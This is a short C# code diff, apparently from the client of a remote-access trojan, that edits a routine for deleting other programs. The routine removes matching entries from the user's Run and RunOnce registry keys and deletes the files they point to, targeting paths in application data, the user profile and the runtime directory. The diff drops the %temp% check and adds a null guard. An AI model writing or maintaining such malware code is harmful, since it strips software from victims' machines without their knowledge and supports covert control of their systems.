@@ -33,7 +33,7 @@ namespace Client.Handle_Packet
                             RegistryDelete(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", pName);
                             System.Threading.Thread.Sleep(100);
                             File.Delete(pName);
-                            count += 1;
+                            count++;
                         }
                 }
                 catch { }
@@ -52,7 +52,6 @@ namespace Client.Handle_Packet
             if (payload == Process.GetCurrentProcess().MainModule.FileName) return false;
             if (payload.Contains(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData))) return true;
             if (payload.Contains(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))) return true;
-            if (payload.Contains(Environment.ExpandEnvironmentVariables("%temp%"))) return true;
             if (payload.Contains("wscript.exe")) return true;
             if (payload.Contains(RuntimeEnvironment.GetRuntimeDirectory())) return true;
             return false;
@@ -67,11 +66,12 @@ namespace Client.Handle_Packet
         {
             using (RegistryKey key = Registry.CurrentUser.OpenSubKey(regPath, true))
             {
-                foreach (string ValueOfName in key.GetValueNames())
-                {
-                    if (key.GetValue(ValueOfName).ToString().Equals(payload))
-                        key.DeleteValue(ValueOfName);
-                }
+                if (key != null)
+                    foreach (string ValueOfName in key.GetValueNames())
+                    {
+                        if (key.GetValue(ValueOfName).ToString().Equals(payload))
+                            key.DeleteValue(ValueOfName);
+                    }
             }
         }
 
